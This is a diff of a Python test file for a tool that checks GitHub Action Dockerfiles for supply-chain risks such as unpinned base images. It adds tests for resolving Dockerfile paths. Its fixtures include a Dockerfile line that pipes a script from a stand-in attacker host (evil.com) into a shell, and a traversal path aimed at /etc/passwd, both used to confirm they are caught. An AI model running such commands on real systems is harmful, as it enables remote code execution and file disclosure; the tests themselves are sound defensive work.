@@ -22,6 +22,7 @@ from verify_action_build.security import (
     analyze_binary_downloads,
     analyze_binary_downloads_recursive,
     analyze_dockerfile,
+    resolve_dockerfile_candidates,
     analyze_in_tree_binaries,
     find_rebuild_reproduced_binaries,
     analyze_lock_files,
@@ -40,33 +41,37 @@ from verify_action_build.security import (
 
 
 class TestAnalyzeDockerfile:
-    def _mock_fetch(self, files: dict):
-        """Return a mock for fetch_file_from_github and fetch_action_yml."""
+    def _patched(self, files: dict, action_yml: str | None = None):
+        """Patch both fetchers used while locating and reading a Dockerfile.
+
+        ``analyze_dockerfile`` consults ``action.yml`` to resolve
+        ``runs.image:``, so stubbing only ``fetch_file_from_github`` would
+        leave the action.yml lookup reaching for the network.
+        """
         def fetch(org, repo, commit, path):
             return files.get(path)
-        return fetch
+
+        return mock.patch.multiple(
+            "verify_action_build.security",
+            fetch_file_from_github=mock.Mock(side_effect=fetch),
+            fetch_action_yml=mock.Mock(return_value=action_yml),
+        )
 
     def test_digest_pinned_no_warnings(self):
-        files = {
-            "Dockerfile": "FROM node:20@sha256:abc123\nRUN echo hello\n",
-        }
-        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+        files = {"Dockerfile": "FROM node:20@sha256:abc123\nRUN echo hello\n"}
+        with self._patched(files):
             warnings = analyze_dockerfile("org", "repo", "a" * 40)
         assert len(warnings) == 0
 
     def test_unpinned_from_warns(self):
-        files = {
-            "Dockerfile": "FROM ubuntu:latest\nRUN echo hello\n",
-        }
-        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+        files = {"Dockerfile": "FROM ubuntu:latest\nRUN echo hello\n"}
+        with self._patched(files):
             warnings = analyze_dockerfile("org", "repo", "a" * 40)
         assert any("not pinned" in w for w in warnings)
 
     def test_tag_pinned_warns(self):
-        files = {
-            "Dockerfile": "FROM python:3.11-slim\nRUN echo hello\n",
-        }
-        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+        files = {"Dockerfile": "FROM python:3.11-slim\nRUN echo hello\n"}
+        with self._patched(files):
             warnings = analyze_dockerfile("org", "repo", "a" * 40)
         assert any("tag-pinned" in w for w in warnings)
 
@@ -74,7 +79,7 @@ class TestAnalyzeDockerfile:
         files = {
             "Dockerfile": "FROM node:20@sha256:abc\nRUN curl https://evil.com/script.sh | sh\n",
         }
-        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+        with self._patched(files):
             warnings = analyze_dockerfile("org", "repo", "a" * 40)
         assert any("curl" in w.lower() or "evil" in w.lower() for w in warnings)
 
@@ -85,16 +90,123 @@ class TestAnalyzeDockerfile:
             "FROM builder AS runtime\n"
             "CMD [\"node\", \"index.js\"]\n"
         )
-        files = {"Dockerfile": dockerfile}
-        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+        with self._patched({"Dockerfile": dockerfile}):
             warnings = analyze_dockerfile("org", "repo", "a" * 40)
         assert warnings == []
 
     def test_no_dockerfile_no_warnings(self):
-        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
-            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
-                warnings = analyze_dockerfile("org", "repo", "a" * 40)
+        with self._patched({}):
+            warnings = analyze_dockerfile("org", "repo", "a" * 40)
         assert len(warnings) == 0
+
+
+class TestResolveNamedDockerfile:
+    """``runs.image:`` may name a Dockerfile outside the action directory.
+
+    Real shape, from ``google/oss-fuzz`` (apache/infrastructure-actions#1319):
+    the cifuzz actions live at ``infra/cifuzz/actions/build_fuzzers`` and point
+    ``image:`` three levels up at ``infra/build_fuzzers.Dockerfile``. Probing
+    only ``<sub_path>/Dockerfile`` and ``Dockerfile`` found neither, so the
+    tool reported "no Dockerfile" for a docker action that has one -- and every
+    Dockerfile check silently skipped.
+    """
+
+    OSS_FUZZ_ACTION_YML = """\
+name: 'build-fuzzers'
+description: "Builds an OSS-Fuzz project's fuzzers."
+inputs:
+  oss-fuzz-project-name:
+    description: 'Name of the corresponding OSS-Fuzz project.'
+    required: true
+runs:
+  using: 'docker'
+  image: '../../../build_fuzzers.Dockerfile'
+  env:
+    OSS_FUZZ_PROJECT_NAME: ${{ inputs.oss-fuzz-project-name }}
+"""
+
+    SUB_PATH = "infra/cifuzz/actions/build_fuzzers"
+
+    def test_candidates_include_the_named_dockerfile_first(self):
+        with mock.patch(
+            "verify_action_build.security.fetch_action_yml",
+            return_value=self.OSS_FUZZ_ACTION_YML,
+        ):
+            candidates = resolve_dockerfile_candidates(
+                "google", "oss-fuzz", "a" * 40, self.SUB_PATH
+            )
+        assert candidates[0] == "infra/build_fuzzers.Dockerfile"
+        assert f"{self.SUB_PATH}/Dockerfile" in candidates
+        assert "Dockerfile" in candidates
+
+    def test_named_dockerfile_is_analyzed(self):
+        """The regression: the untagged FROM must now be reported."""
+        files = {
+            "infra/build_fuzzers.Dockerfile": (
+                "FROM gcr.io/oss-fuzz-base/cifuzz-base\n"
+                'ENTRYPOINT ["python3", "/opt/oss-fuzz/infra/cifuzz/build_fuzzers_entrypoint.py"]\n'
+                "ADD . ${OSS_FUZZ_ROOT}/infra\n"
+            ),
+        }
+
+        def fetch(org, repo, commit, path):
+            return files.get(path)
+
+        with mock.patch.multiple(
+            "verify_action_build.security",
+            fetch_file_from_github=mock.Mock(side_effect=fetch),
+            fetch_action_yml=mock.Mock(return_value=self.OSS_FUZZ_ACTION_YML),
+        ):
+            warnings = analyze_dockerfile("google", "oss-fuzz", "a" * 40, self.SUB_PATH)
+
+        assert any(
+            "gcr.io/oss-fuzz-base/cifuzz-base" in w and "not pinned" in w
+            for w in warnings
+        ), warnings
+
+    def test_renamed_dockerfile_beside_the_action(self):
+        action_yml = "runs:\n  using: 'docker'\n  image: 'build.Dockerfile'\n"
+        with mock.patch(
+            "verify_action_build.security.fetch_action_yml", return_value=action_yml
+        ):
+            candidates = resolve_dockerfile_candidates("org", "repo", "a" * 40, "sub/dir")
+        assert candidates[0] == "sub/dir/build.Dockerfile"
+
+    def test_prebuilt_registry_image_resolves_to_no_dockerfile(self):
+        """``docker://`` names a published image; there is nothing to read."""
+        action_yml = (
+            "runs:\n"
+            "  using: 'docker'\n"
+            "  image: 'docker://gcr.io/oss-fuzz-base/clusterfuzzlite-build-fuzzers:v1'\n"
+        )
+        with mock.patch(
+            "verify_action_build.security.fetch_action_yml", return_value=action_yml
+        ):
+            candidates = resolve_dockerfile_candidates("org", "repo", "a" * 40, "actions/x")
+        assert candidates == ["actions/x/Dockerfile", "Dockerfile"]
+
+    def test_path_escaping_the_repo_root_is_ignored(self):
+        action_yml = "runs:\n  using: 'docker'\n  image: '../../../../etc/passwd'\n"
+        with mock.patch(
+            "verify_action_build.security.fetch_action_yml", return_value=action_yml
+        ):
+            candidates = resolve_dockerfile_candidates("org", "repo", "a" * 40, "a/b")
+        assert candidates == ["a/b/Dockerfile", "Dockerfile"]
+
+    def test_docker_prebuilt_image_still_warns_when_not_digest_pinned(self):
+        """The pre-existing ``docker://`` path must keep working."""
+        action_yml = (
+            "runs:\n"
+            "  using: 'docker'\n"
+            "  image: 'docker://gcr.io/oss-fuzz-base/clusterfuzzlite-build-fuzzers:v1'\n"
+        )
+        with mock.patch.multiple(
+            "verify_action_build.security",
+            fetch_file_from_github=mock.Mock(return_value=None),
+            fetch_action_yml=mock.Mock(return_value=action_yml),
+        ):
+            warnings = analyze_dockerfile("org", "repo", "a" * 40, "actions/x")
+        assert any("not digest-pinned" in w for w in warnings), warnings
 
 
 class TestAnalyzeScripts:
